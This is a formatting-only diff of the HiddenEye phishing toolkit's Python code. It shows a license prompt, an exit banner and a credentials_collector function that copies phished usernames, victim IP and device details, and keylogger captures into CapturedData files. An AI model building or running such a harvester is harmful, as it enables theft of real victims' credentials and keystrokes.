@@ -58,10 +58,12 @@ def exit_message(port=80):  # Message when HiddenEye exit
         run_command("clear")
         print(global_localization.hidden_eye_logo)
         print("                             " + global_localization.by_darksec)
-        print("                       " + global_localization.official_website_link)
+        print("                       " +
+              global_localization.official_website_link)
         print(localization.lang_exit_message["help_to_improve_this_tool"])
         print(localization.lang_exit_message["tell_if_page_got_broken"])
-        print(localization.lang_exit_message["make_your_pull_request_or_issue"])
+        print(
+            localization.lang_exit_message["make_your_pull_request_or_issue"])
         print(localization.lang_exit_message["small_disclaimer_suggestion"])
         print(localization.lang_exit_message["forum_suggestion"])
         print(localization.lang_exit_message["financial_support"])
@@ -83,15 +85,16 @@ def terms_of_service_message():  # menu where user select what they wanna use
     if not agreement:
         print(localization.lang_terms_of_service_message["GPL_3.0"])
         print(
-            localization.lang_terms_of_service_message[
-                "great_power_great_responsibility"
-            ]
-        )
-        print(localization.lang_terms_of_service_message["do_you_accept_license"])
-        print(localization.lang_terms_of_service_message["enter_this_to_confirm"])
+            localization.
+            lang_terms_of_service_message["great_power_great_responsibility"])
+        print(localization.
+              lang_terms_of_service_message["do_you_accept_license"])
+        print(localization.
+              lang_terms_of_service_message["enter_this_to_confirm"])
         agreement = input(global_localization.input_line)
         if localization.text_to_confirm_license not in agreement:
-            print(localization.lang_terms_of_service_message["you_are_not_allowed"])
+            print(localization.
+                  lang_terms_of_service_message["you_are_not_allowed"])
             exit()
         else:
             eula = open("eula.txt", "w")
@@ -113,17 +116,17 @@ def credentials_collector(port):
         with open("Server/www/usernames.txt") as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                log_writer(
-                    localization.lang_credentials_collector["credentials_found"]
-                    + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines)
-                )
+                log_writer(localization.
+                           lang_credentials_collector["credentials_found"] +
+                           "{0}{2}{1}".format(default_palette[2],
+                                              default_palette[3], lines))
                 # run_command("touch Server/CapturedData/usernames.txt
                 pathlib_Path("Server/CapturedData/usernames.txt").touch(
-                    mode=0o777, exist_ok=True
-                )
+                    mode=0o777, exist_ok=True)
 
                 # && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt
-                captured_usernames = open("Server/CapturedData/usernames.txt", "a")
+                captured_usernames = open("Server/CapturedData/usernames.txt",
+                                          "a")
                 new_usernames = open("Server/www/usernames.txt")
                 captured_usernames.write(new_usernames.read())
                 new_usernames.close()
@@ -142,14 +145,13 @@ def credentials_collector(port):
         with open("Server/www/ip.txt") as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                log_writer(
-                    localization.lang_credentials_collector["device_details_found"]
-                    + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines)
-                )
+                log_writer(localization.
+                           lang_credentials_collector["device_details_found"] +
+                           "{0}{2}{1}".format(default_palette[2],
+                                              default_palette[3], lines))
                 # run_command('touch Server/CapturedData/ip.txt
-                pathlib_Path("Server/CapturedData/ip.txt").touch(
-                    mode=0o777, exist_ok=True
-                )
+                pathlib_Path("Server/CapturedData/ip.txt").touch(mode=0o777,
+                                                                 exist_ok=True)
                 # && cat Server/www/ip.txt >> Server/CapturedData/ip.txt
                 captured_ips = open("Server/CapturedData/ip.txt", "a")
                 new_ips = open("Server/www/ip.txt")
@@ -173,16 +175,16 @@ def credentials_collector(port):
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 log_writer(global_localization.line_of_dots)
-                log_writer(
-                    localization.lang_credentials_collector["getting_pressed_keys"]
-                    + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines)
-                )
+                log_writer(localization.
+                           lang_credentials_collector["getting_pressed_keys"] +
+                           "{0}{2}{1}".format(default_palette[2],
+                                              default_palette[3], lines))
                 # run_command('touch Server/CapturedData/KeyloggerData.txt
                 pathlib_Path("Server/CapturedData/KeyloggerData.txt").touch(
-                    mode=0o777, exist_ok=True
-                )
+                    mode=0o777, exist_ok=True)
                 # && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt
-                captured_keys = open("Server/CapturedData/KeyloggerData.txt", "a")
+                captured_keys = open("Server/CapturedData/KeyloggerData.txt",
+                                     "a")
                 new_keys = open("Server/www/KeyloggerData.txt")
                 captured_keys.write(new_keys.read())
                 new_keys.close()
@@ -206,13 +208,9 @@ def credentials_collector(port):
 def log_writer(ctx):  # Writing log
     logFile = open("log.txt", "w")
     logFile.write(
-        ctx.replace(default_palette[0], "")
-        .replace(default_palette[1], "")
-        .replace(default_palette[2], "")
-        .replace(default_palette[3], "")
-        .replace(default_palette[4], "")
-        + "\n"
-    )
+        ctx.replace(default_palette[0], "").replace(
+            default_palette[1], "").replace(default_palette[2], "").replace(
+                default_palette[3], "").replace(default_palette[4], "") + "\n")
     print(ctx)
 
 
@@ -255,7 +253,8 @@ def global_message():
     print(global_localization.line_of_dots)
 
 
-def verify_connection(host="https://dark-sec-official.com"):  # Connection check
+def verify_connection(
+        host="https://dark-sec-official.com"):  # Connection check
     run_command("clear")
     try:
         req = requests.get(host, timeout=25)
